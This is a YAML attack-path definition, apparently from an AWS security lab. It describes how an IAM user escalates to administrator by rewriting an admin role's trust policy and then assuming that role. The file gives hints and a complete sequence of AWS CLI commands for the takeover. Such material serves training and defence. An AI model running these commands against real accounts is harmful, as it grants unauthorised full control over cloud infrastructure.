attackMap:
  nodes:
    - id: starting-principal
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-iam-012-to-admin-starting-user"
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has iam:UpdateAssumeRolePolicy permission on the target admin role,
        allowing them to modify who is trusted to assume that role. They also have
        sts:AssumeRole permission on the same role, enabling them to assume it once
        the trust policy has been modified.

    - id: target-role
      label: "Admin Role"
      type: principal
      subType: iam-role
      isTarget: true
      arn: "arn:aws:iam::{account_id}:role/pl-prod-iam-012-to-admin-target-role"
      description: >
        This IAM role has AdministratorAccess. Its trust policy initially only allows
        the EC2 service to assume it, but the starting user can modify that trust policy
        to add themselves as a trusted principal. Once the trust policy is updated and
        IAM changes propagate (~15 seconds), the starting user can assume this role
        and gain full administrative access to the AWS account.

  edges:
    - from: starting-principal
      to: target-role
      label: "iam:UpdateAssumeRolePolicy + sts:AssumeRole"
      description: >
        The attacker uses iam:UpdateAssumeRolePolicy to modify the admin role's trust
        policy, adding their own user ARN as a trusted principal. After waiting for
        IAM propagation, they assume the role with sts:AssumeRole to gain full
        administrative access.
      hints:
        - "You can modify who is trusted to assume certain roles."
        - "Look for roles with elevated permissions whose trust policies you can update."
        - "Once you add your principal to a role's trust policy, you can assume it with sts:AssumeRole."
        - "Browse to https://pathfinding.cloud/paths/iam-012 for technique details."
      commands:
        - description: "Get the attacker's user ARN"
          command: "aws sts get-caller-identity --query 'Arn' --output text"
        - description: "Update the admin role's trust policy to allow the attacker to assume it"
          command: "aws iam update-assume-role-policy --role-name pl-prod-iam-012-to-admin-target-role --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"<attacker_user_arn>\"},\"Action\":\"sts:AssumeRole\"}]}'"
        - description: "Assume the admin role after IAM changes propagate (~15 seconds)"
          command: "aws sts assume-role --role-arn arn:aws:iam::{account_id}:role/pl-prod-iam-012-to-admin-target-role --role-session-name admin-escalation-session --output json"
        - description: "Verify administrative access by listing IAM users"
          command: "aws iam list-users --max-items 3 --output table"
